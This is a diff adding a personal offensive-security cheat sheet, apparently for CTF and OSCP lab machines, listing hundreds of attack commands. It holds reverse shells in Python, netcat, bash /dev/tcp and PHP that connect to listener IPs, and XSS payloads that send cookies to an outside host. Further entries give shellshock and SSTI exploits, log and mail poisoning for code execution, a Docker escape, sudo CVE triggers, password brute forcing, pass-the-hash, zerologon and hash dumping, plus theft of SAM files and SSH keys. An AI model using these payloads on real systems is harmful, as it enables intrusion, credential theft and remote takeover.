@@ -1,0 +1,497 @@
+ldapsearch -x -h 10.10.10.182 -p 389 -s sub -b 'dc=cascade,dc=local'
+ldapsearch -x -h 10.10.10.182 -s base namingcontexts
+rpcclient -U '' -N 10.10.10.182
+wfuzz --hw 76 -w /usr/share/seclits/Discovery/DNS/namelists.txt -u ceng-company.vm -H 'Host: FUZZ.ceng-company.vm' (fuzz all subdomain)
+echo "sudo chmod u+x /usr/bin/find" >> /etc/update-motd.d/00-header
+find . -exec /bin/bash -p \; -quit
+find / -type f -perm -g+rwx 2>/dev/null
+find / -perm 4000 -type f 2>/dev/null
+find /etc/ -type f -writable 2>/dev/null
+find / -name “<username>” 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+sudo PYTHONPATH=~/fakelib/ opt/scripts/admin_tasks.sh
+mysql - load data local file '../index.php' into table test fields terminated by "/n"
+cewl <url> -d 10 -m 1 -w list
+cewl http://fieldforce:60000/2020/07/28/hello-world/ --with-numbers > list
+cat <file> | xclip -sel clip
+tomcat - /usr/share/tomcat9/etc/tomcat-users.xml (view in page source)
+stty raw -echo
+export SHELL=bash
+/var/log/apache2/access.log (vulnerable)
+/etc/knockd.conf
+prot knocking - for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done
+file=|php%20-r%20'%24sock%3Dfsockopen(%22192.168.99.4%22%2C2233)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.13.37.11/FUZZ -e .php,.html,.txt
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.110.216/FUZZ
+gobuster vhost -u file.oscp -w /usr/share/wordlists/subdomains
+crackmapexec smb 192.168.88.30 -u william -p /usr/share/wordlists/rockyou.txt
+gobuster dir -u http://192.168.40.86:10300/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x .html,.php,.txt,.bak,.zip,.bak,.config,.json -b 401,403,404,500 --wildcard
+gobuster dir -u http://192.168.0.158/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50
+gobuster dir -u http://192.168.88.59/ -t 50  -w /usr/share/seclists/Discovery/Web-Content/coldfusion.txt  -x .html,.php,.txt,.bak,.zip,.bak,.config,.json -b 401,403,404,500 --wildcard
+gobuster dir -u http://192.168.35.87:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -e
+dirsearch -u http://file.oscp:7080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -e php,txt,html,zip,bak,config,json -t 100
+openssl passwd -1 -salt <username> <passwd>
+mkpasswd -m SHA-512
+X-Forwarded-For: localhost
+hashcat -m 1800 -a 0 -o found.txt --show hash.txt rockyou.txt
+apache2 log poisoning - /opt/bitnami/apache2/logs/access_log, edit request and modify the user-agent to <?php system($_GET['c']); ?>, url?file=/opt/bitnami/apache2/logs/access_log&c=ls -la
+sudo vim -c ':!/bin/sh' (bypass rbash)
+hydra -L user -P list -e nsr -t 32 ssh://192.168.88.51
+http authenticaiton - /etc/apache2/.htpasswd
+/etc/crontab
+/bin/bash -p
+/bin/bash --version
+perl -e 'exec "/bin/bash";'
+/usr/bin/script -qc /bin/bash /dev/null
+foo.php?page=../../../../../etc/passwd%00
+/etc/apache2/sites-enabled/000-default.conf
+npm - cat package.json, sudo -u server-managemnet npm install, sudo -u server-management npm run-script shell
+cat package.json
+{
+  "name": "tmp",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "shell": "/bin/bash"
+  },
+  "author": "",
+  "license": "ISC"
+}
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.157",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > shell.sh
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.19.40",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+tar wildcard injection - creat reverse shell using above payload, echo "" > "--checkpoint-action=exec=sh shell.sh", echo "" > --checkpoint=1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.19.40 5051 >/tmp/f
+/usr/bin/bsae32 /etc/shadow | /usr/bin/base32 -d 
+/usr/bin/find . -exec /bin/sh -p \; -quit;
+spawn shell - /usr/bin/script -qc /bin/bash /dev/null
+hashcat -a 0 -m <1800> <sha512 hashfile name> /usr/share/wordlists/rockyou.txt –force	
+ssh -L 5000:127.0.0.1:5000 flagman@192.168.88.40
+shellshock - curl -v -A "() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.19.40/1234 0>&1' " http://192.168.43.233/cgi-bin/test/test.cgi
+sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= --dbs --batch
+sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= -D <db_name> -T <table_name> --dump --batch
+/..%01/..%01/..%01/..%01/etc/passwd
+gcc vuln.c -o vuln -fno-stack-protector -m32
+/etc/supervisord.conf, /root/.profile, /usr/bin/passwd,  /etc/ssh/sshd_config, /var/mail
+grep -iRl "text" . (find file contains specific text)
+msf - portfwd add -l 8081 -p 8080 -r 127.0.0.1 (forward 127.0.0.1:8080 to local machine 8081)
+import os;os.system("/bin/bash -i");
+zsteg -a <file>
+binwalk -e <file>
+/bin/sh 0</tmp/backpipe | nc 10.10.14.62 5050 1>/tmp/backpipe
+<img src=x onerror=this.src='http://<YOUR_IP>:8000/?'+document.cookie;>
+/proc/sys/kernel/unprivileged_bpf_disabled = 0 (kernel exploit)
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp	
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.203.232
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+sudoedit -s '\' $(python3 -c 'print("A"*1000)') --> check for sudoedit heap overflow https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156
+perl -e 'print(("A" x 100 . "\x{00}" x 50)' | sudo -S id -->  CVE-2019-18634 https://github.com/saleemrashid/sudo-cve-2019-18634
+\\192.168.119.157\kali\nc.exe -e cmd 192.168.119.157 1234
+getcap -r / 2>/dev/null
+./socat TCP-LISTEN:9999,fork TCP:127.0.0.1:8080
+cat /etc/exports
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+sudo -u#-1 /bin/bash
+/var/www/html/conf/settings.xml
+grep 'marcus' /etc -R 2>/dev/null
+dig @10.13.37.10 -x 10.13.37.10
+<svg/onload=alert(2)>
+<script>new Image().src="http://10.10.14.13/"+document.cookie;</script>
+flask-unsign --decode --cookie <flask jwt>
+.php,.phtml,.shtml,.cgi,.pl,.php3,.php4,.php5,.php6,.phar
+
+
+
+Msfvenom:
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.93 LPORT=9001 -f exe -o "r'dedsec.exe"
+- msfvenom -p cmd/unix/reverse_perl LHOST=192.168.88.4 LPORT=1234 -f raw
+- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.34.183 LPORT=1234 -f msi -o reverse.msi
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.138.215 LPORT=53 -f exe -o reverse.exe
+
+Metasploit:
+- use multi/manage/shell_to_meterpreter
+- migrate <process-id> (migrate to process which run with higher privilege)
+- hashdump (retrieve NTLM hash)
+
+SSH Log Poisoning:
+/var/log/auth.log
+ssh '<?php system($_GET['c']); ?>'@192.168.1.31
+url?file=/var/log/auth&c=ls -la
+
+pip install virtualenv
+virtualenv -p /usr/bin/python2.7 venv # or wherever your python2.7 resides
+source venv/bin/activate.sh
+
+Sqlmap:
+- sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
+
+SSTI:
+- {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEK | base64 -d | bash")["read"]() %} a {% endwith %}
+	- change the base64 string with your ip and port and again encode with base64 and paste it in payload
+
+XXE:
+- username=%26username%3b&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+
+Nmap:
+nmap --script=smb-vuln-* 10.11.1.5
+nmap -vv -p 88 --script=krb5-enum-users.nse --script-args krb5-enum-users.realm='svcorp.com',userdb=/usr/share/seclists/Usernames/Names/names.txt svcorp.com -oN kerberos-accounts
+nmap -p389 --script ldap-search 10.11.1.20
+nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.11.1.146
+
+Mail Poisoning:
+nc <ip> 25
+	EHLO someone
+	VRFY <user>@localhost (verify if user exists)
+	mail from: abc@someone.com
+	rcpt to: <user>@localhost
+	data
+	Subject: You are owned
+	<? echo system($_REQUEST['cmd']); ?>
+	.
+	quit
+../../../../var/mail/<user>&cmd=bash+-i+>%26+/dev/tcp/<ip>/4545+0>%261
+
+Command Injection:
+exec_string=$1;
+go=`echo "$1" | base64 | cut -d "=" -f 1`
+curl -s "http://ip-address/index.php?u);system(base64_decode(%27$go%27)=/"
+
+ssh port forwarding: 
+- ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228
+- ssh -i id_chiv -L 9002:localhost:8080 chiv@spider.htb (forward port remote 8080 to local 9002)
+
+SNMP:
+- snmpcheck <ip> -c public
+- snmpwalk -c public -v1 <ip> 
+- snmpwalk -c public -v1 10.11.1.115 [1].3.6.1.2.1.31
+- snmpenum -t <ip>
+- onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.11.1.115
+	- echo public > community
+	- echo private >> community
+	- echo manager >> community
+	-  onesixtyone -c community <ip>
+- snmpwalk -v 1 -c public 10.13.37.11
+- nping --udp -c 2 -p 161 pit.htb
+- snmpbw pit.htb public 2 1
+
+Docker:
+docker container list
+docker exec -it <contianer>
+docker run -v /:/mnt --rm -it -ubuntu chroot /mnt sh
+docker images(check docker)
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+docker run -v /:/mnt/mygod -ti <imageID>
+
+Docker Escape:
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+#For a normal PoC =================
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+#===================================
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/10.10.14.2/1234 0>&1" >> /cmd
+chmod a+x /cmd
+#===================================
+
+GitLab:
+/opt/gitlab/embedded/service/gitlab-rails/config/
+
+GitHub:
+./gitdumper.sh  http://devguru.local/.git website
+./extractor.sh ../Dumper/website ./website
+site/.git/COMMIT_EDITMSG
+git show <hash>
+
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+head /output
+
+
+USB Creator Dbuss:
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
+https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+
+AWS Bucket:
+- aws configure (configure access key)
+- aws s3 ls s3://<bucketName> (Eg:https://hackerone-attachments.s3.amazonaws.com, bucketName: hackerone-attachments)
+- aws s3 mv test.txt s3://hackerone-attachments (if failed, try to delete the file to see whether it's really fail)
+- aws s3 rm s3://hackerone-attachments/test.txt
+
+- aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+- aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
+- aws --endpoint-url http://s3.bucket.htb/ s3 ls
+- aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/
+- aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images/
+- aws --endpoint-url http://s3.bucket.htb/ s3 cp reverse.php s3://adserver/reverse.php
+
+LDAP:
+- ldapsearch -x -h <ip/hostname> -p 3268 > ldap.txt
+- ldapsearch -x -h cascade.htb -s sub -b 'dc=cascade,dc=local' > ldap1.txt
+- cat ldap.txt | grep -ie "ou=users" | awk -F 'CN=' '{print $2}' | awk -F ',' '{print $1}' | sort -u > name
+- while read f; do cat ldap.txt | grep -A 13 $f >> parsed; done < name (This was supposed to be a parsed version of the ldap details that we’ve collected earlier)
+- ldapsearch -x -h cascade.htb -s sub -b 'dc=cascade,dc=local' > ldap1.txt 
+
+SMB:
+- smbclient -L //10.10.10.219
+- smbclient //10.10.10.219/kanban
+- smbclient -U <username> //<ip>/<share>
+- smbget -R smb://10.10.10.219/kanban -U Anonymous
+- smbclient --list //cascade.htb/ -U ‘r.thompson’
+- smbmap -u <username> -p <password> -H <ip> -R
+- smbmap -u <username> -p <password> -H <ip> -R list
+- smbmap -u <username> -p <password> -H <ip> --download <file-path>
+- crackmapexec smb 10.10.10.219 -u user.txt -p password.txt
+- logon "/=`nc '192.168.119.157' 4444 -e /bin/bash`"
+
+Wordpress:
+- use exploit/unix/webapp/wp_admin_shell_upload
+- use exploit/unix/webapp/wp_slideshowgallery_upload
+- use exploit/unix/webapp/wp_reflexgallery_file_upload 
+
+initctl:
+- edit the /etc/init/test.conf
+- add this script:
+	- script
+	- chmod +s /bin/bash
+	- end script
+- sudo /sbin/initctl stop test
+- sudo /sbin/initctl start test
+- /bin/bash -p
+- whoami
+
+OS=NetBSD (Lua Code Injection)
+- abc?city=Leeds%27)%20os.execute(%27id
+- abc?city=Leeds%27)%20print(%27id
+- abc?city=Leeds%27)%20os.execute(%27id%27)--
+- abc?city=Leeds%27)%20os.execute(%27rm+%2ftmp%2ffa%3bmkfifo+%2ftmp%2ffa%3bcat+%2ftmp%2ffa%7c%2fbin%2fsh+-i+2>%261%7cnc+10.10.14.56+1234+>%2ftmp%2ffa%3b%27)--
+
+Drupal:
+- droop
+
+Lua:
+- lua -e 'os.execute("/bin/sh")'
+- lua -e 'os.execute("/bin/bash")'
+
+Decrypt enc file:
+- netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel.tar.gz
+
+JWT token
+- create jwt token: python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name":"1","exp":' `date -d "+7 days" +%s`} | base64 -w0).
+
+
+
+Buffer Overflow:
+- -fno-stack-protector(disabled the stack protection)(Disables Stack Canaries)
+- -m2 (made sure that the compiled binary is 32 bit)
+- -no-pie : Disables Position Independent Executables
+- -z execstack : Disables Executable Stack
+- echo 0 | sudo tee /proc/sys/kernel/randomize_va_space (disable ASLR)
+- gcc vuln.c -o vuln -fno-stack-protector (for 32 bit system)
+- gcc vuln.c -o vuln -fno-stack-protector -m32 (for 64 bit system)
+- objdump -d <file>
+- !mona modules (look for FALSE)
+- !mona find -s "/xff/xe4" <module.dll>
+- Display Dynamic Relocation Entries: objdump -R YOUR_BINARY
+- Show Program Header Table: readelf -l YOUR_BINARY
+- Show Section Header Table: readelf -S YOUR_BINARY
+- Display Relocations: readelf -r YOUR_BINARY
+
+GDB:
+- set disassembly-flavor intel
+- code: (not gdb command)
+	- add $0x10, %esp (_init stack clean up)
+	- check bytes allocated for input
+		- push %ebp
+		- mov %esp, %ebp
+		- sub $0x8, %esp
+		- sub $0xc, %esp
+- list
+- list main
+- info os
+- info functions
+- info variables
+- disass main
+- run <input>
+- run $(python -c 'print "\x41" * 100)
+- run <<< $(python -c 'print "\x41" * 100)
+- run <<< $(python file.py)
+- info registers
+- x/50xw $esp -100
+- x/200x ($esp - 550) (examine memory address)
+- info address <function>
+- print &<function> "or" print <function>
+- info b
+	- del <num> (delete breakpoint)
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 > b.txt
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
+
+*buffer+ebp(4)+eip(4)
+
+##payload 
+import struct
+def p(x):
+        return struct.pack("<L", x)
+ 
+offset = 42
+hacker = 0x565561b9
+ 
+payload = ""
+payload += "A" * offset
+payload += p(hacker)
+ 
+print payload
+
+
+Hping3:
+- hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa  
+- hping3 --icmp 127.0.0.1 --listen signature --safe
+
+Pop3:
+- USER <username>
+- PASS <password>
+- RETR 1
+- STAT
+- LIST
+
+Common log file location:
+http://example.com/index.php?page=http://attacker.com/evil.txt
+	- <?php echo shell_exec("whoami");?>
+	- <?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
+http://10.11.1.35/section.php?page=data://text/plain,%3C?php%20phpinfo();%20?%3E
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+/proc/sched_debug
+/etc/passwd.php
+/var/log/apache/error.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache2/access.log
+/var/log/httpd/error_log
+/var/log/httpd/access_log
+/var/log/httpd-error.log
+/var/log/httpd-access.log
+/etc/apache2/apache2.conf
+/etc/apache2/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/httpd.conf
+/etc/httpd/conf/httpd.conf
+/usr/local/etc/apache2/httpd.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/php.ini
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/www/wordpress/wp-config.php
+/proc/self/fd/[0-30]
+/etc/apache2/sites-available/000-default.conf
+
+
+/etc/passwd:
+- openssl passwd -1 -salt ignite pass123
+- chiya:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
+	- username: chiya
+	- password: pass123
+	
+
+RPCBIND:
+- rpcinfo -p <ip>
+- rpcclient -user=<username> -command=enumprivs <ip>
+- rpcdump.py 
+- enum4linux -a <ip>
+- nbtscan <ip>
+- samrdump.py <ip>
+
+preg_replace vuln:
+- swearwords%5B%2Ffuck%2Fe%5D=system('ps+aux');&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=asd@asd.com&subject=asd&message=fuck
+- swearwords[/fuck/e]=system('ps aux');&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=asd@asd.com&subject=asd&message=fuck
+- /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls 
+	- swearwords[/fuck/ie]=system($_GET["cmd"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=nora@example.com&subject=sdfj&message=swearwords[/fuck/]&_wysihtml5_mode=1
+
+Mounting File Share:
+- showmount -e <ip>
+- mount <ip>:/vol/share /mnt/nfs -nolock
+- mount -t cifs -o username=user,password=pass,domain=blah //<ip>/share-name /mnt/cifs
+- net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no
+- mount -t nfs 192.168.1.72:/home/vulnix /tmp/nfs -nolock
+
+Oracle:
+- sqlplus web_app/dsfdfoj435GEre4@10.11.1.222/XE
+- sqlplus web_app/dsfdfoj435GEre4@10.11.1.222/XE as sysdba
+	- SET PAGESIZE 500;
+	- SET LINESIZE 500;
+	- SELECT * FROM V$VERSION;
+	- SELECT * FROM all_users;
+	- SELECT * FROM user_role_privs;
+	- SELECT TABLESPACE_NAME FROM USER_TABLESPACES;
+- tnscmd10g status -h 10.10.10.82
+- tnscmd10g version -p 1521 -h 10.10.10.82
+- tnscmd10g status -h 10.10.10.82 --10G
+- python3 odat.py sidguesser -s 10.10.10.82 -p 1521 (enumerate sid)
+- python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt (enumerate acc)
+- (put file) python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe (if insufficient privilege, try below)
+- (put file) python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
+- python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba (execute shell)
+
+Active Directory:-
+- kerbrute 
+	- kerbrute userenum --dc spookysec.local -d spookysec.local  userlist.txt
+	- --dc <ip> -d <domain>
+- impacket
+	- GetNPUsers.py (query accounts that dont need pre-auth)(query ASReproastable accounts from the Key Distribution Center.)
+		- GetNPUsers.py spookysec.local/svc-admin -no-pass
+		- GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.59.6
+		- Result: Return TGT hash for svc-admin
+		- hashcat --force -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt 
+	- secretsdump.py (retrieve all of the password hashes)
+		- secretsdump.py -ntds test.dit
+		- secretsdump.py spookysec.local/backup:'backup2517860'@<ip> -just-dc
+		- -just-dc (grab NTDS.DIT data and Kerberos keys)
+		- secretsdump.py -dc-ip 10.10.104.142 spookysec.local/backup:backup2517860@10.10.104.142
+		- Result: return user, lm hash and ntlm hash <LMHASH:NTHASH>
+	- if got the hashes, get shell on target machine via: (either one)
+		- getTGT.py spookysec.local/Administrator -hashes <LMHASH:NTHASH>
+		- smbclient.py -hashes <LMHASH:NTHASH> spookysec.local/Administrator@<ip>
+		- pth-smbclient -U spookysec.local/Administrator%<LMHASH:NTLMHASH> //<ip>/c$
+		- crackmapexec smb <ip> -u Administrator -H <LMHASH:NTLMHASH> -x whoami
+			- crackmapexec <ip> -u <user> -p <password>
+		- psexec.py -hashes <LMHASH:NTLMHASH> Administrator@<ip>
+		- wmiexec.py -hashes <LMHASH:NTLMHASH> Administrator@<ip>
+		- pth-wmic -U spookysec.local/Administrator%<LMHASH:NTLMHASH> //<ip> "select Name from Win32_UserAccount" (enumerate username)
+		- samrdump.py -hashes <LMHASH:NTLMHASH> spookysec.local/Administrator@<ip> (enumerate username)
+		- reg.py -hash <LMHASH:NTLMHASH> spookysec.local/Administrator@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s (read,modify and delete registry values)
+		- evil-winrm -i <ip> -u Administrator -H <NTLMHASH>
+	- psexec.py <domain_name>/<user_name>@<ip> -k -no-pass
+	- GetUserSPNs.py
+	- smbexec.py <domain_name>/<user_name>@<ip> -k -no-pass
+	- wmiexec.py <domain_name>/<user_name>@<ip> -k -no-pass
+	- lookupsid.py (enumerate user)
+	- rpcdump.py (enumerate endpoints)
+	- services.py (enumerate sevices and make changes)
+	- ifmap.py <ip> (enumerate interface IDs, UUIDs are mapped to unique services, check online if the services are vulnerable)
+	- opdump.py <ip> <port interface version>
+		- port interface version: UUID from ifmap (99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0)
+		- rpc_x_bad_stub_data, rpc_s_access_denied, and success generally means there’s an operation at that number
+	- getArch.py <ip> (enumerate OS architecture)
+	- netview.py <domain>/<user> -target <ip> -users <userlist>
+	- zerologon.py <NetBIOS name> <ip>
+		- secretsdump.py -just-dc -no-pass <NetBIOS name>\$@<ip>
+	- smbserver.py kali . (run in kali)
+		- copy \\192.168.19.40\kali\procdump64.exe C:\PrivEsc\reverse.exe (copy from kali to wins)
+		- copy C:\Windows\Repair\SAM \\192.168.119.157\kali\ (copy from wins to kali)
+		
